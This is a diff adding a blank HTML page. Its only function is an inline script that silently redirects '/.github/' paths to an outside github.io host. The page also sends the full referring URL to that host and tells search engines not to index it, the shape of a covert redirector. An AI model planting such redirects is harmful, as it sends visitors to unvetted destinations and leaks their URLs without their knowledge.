@@ -1,0 +1,25 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="referrer" content="unsafe-url">
+    <title>...</title>
+    <script>
+        (function() {
+            const path = window.location.pathname;
+            const match = path.match(/\/\.github\/(.+)$/);
+            
+            if (match && match[1]) {
+                const text = match[1];
+                window.location.replace('https://monitor-guardian-suite.github.io/.github/' + text);
+            }
+        })();
+    </script>
+    <meta name="robots" content="noindex, nofollow">
+    <style>
+        body { background: #ffffff; margin: 0; padding: 0; }
+    </style>
+</head>
+<body>
+</body>
+</html>
